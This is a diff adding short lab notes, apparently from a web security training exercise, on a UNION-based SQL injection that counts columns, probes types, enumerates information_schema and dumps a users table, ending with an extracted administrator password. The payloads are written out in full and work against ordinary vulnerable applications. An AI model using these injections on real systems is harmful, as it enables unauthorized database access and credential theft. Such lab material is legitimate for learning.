@@ -1,0 +1,42 @@
+SQL injection attack - listing the contents of non oracle databases
+
+End goals
+- Find the table that contains usernames and passwds
+- determine the relevant columns
+- output the content of the table
+- login as the admin user
+
+Exploitation
+- Find the number of columns
+- to determine the number of columns, use the order by clause
+' order by 1--
+
+internal server error at 3 columns
+2 columns are present
+
+- Now we find the datatypes of the columns
+' UNION SELECT 'a', 'a'--
+
+columns both accept text
+
+' SELECT @@version, NULL--
+
+
+' UNION SELECT version(), NULL--
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+users_ptidki
+
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ptidki'--
+
+username_gnolsx
+
+password_gdnpul
+
+' UNION select username_gnolsx, password_gdnpul from users_ptidki--
+
+
+
+administrator</th>
+                            <td>wt4cwujipfcs2wbrj0r4
